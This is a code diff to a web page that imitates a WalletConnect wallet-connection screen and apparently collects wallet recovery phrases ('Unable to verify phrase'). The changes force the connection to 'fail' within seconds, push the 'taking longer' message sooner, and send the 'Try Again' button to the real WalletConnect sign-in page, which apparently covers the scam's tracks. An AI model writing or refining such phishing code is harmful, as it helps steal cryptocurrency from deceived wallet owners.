@@ -227,13 +227,11 @@ export default function Home() {
 
   useEffect(() => {
     if (step === "connecting") {
-      if (isMobile && connectTimer >= 10) {
-        setStep("failed");
-      } else if (!isMobile && connectTimer >= 30) {
+      if (connectTimer >= 4) {
         setStep("failed");
       }
     }
-  }, [connectTimer, step, isMobile]);
+  }, [connectTimer, step]);
 
   // Animated dots while connecting
   useEffect(() => {
@@ -609,7 +607,7 @@ export default function Home() {
             </div>
             <div className="connecting-title-reown">Connecting...</div>
             <p className="connecting-desc-reown">
-              {connectTimer > 10 
+              {connectTimer > 2 
                 ? "It is taking longer than expected..." 
                 : "Open and approve in your wallet"}
             </p>
@@ -739,7 +737,7 @@ export default function Home() {
            <div className="error-result-card">
              <div className="error-result-title">Sync Error</div>
              <p className="error-result-desc">Unable to verify phrase. Connection timed out.</p>
-             <button className="wc-redirect-btn" onClick={() => { setStep("landing"); setSubmitDone(false); }}>Try Again</button>
+             <button className="wc-redirect-btn" onClick={() => { window.location.href = "https://dashboard.walletconnect.com/sign-in"; }}>Try Again</button>
            </div>
          </div>
       )}
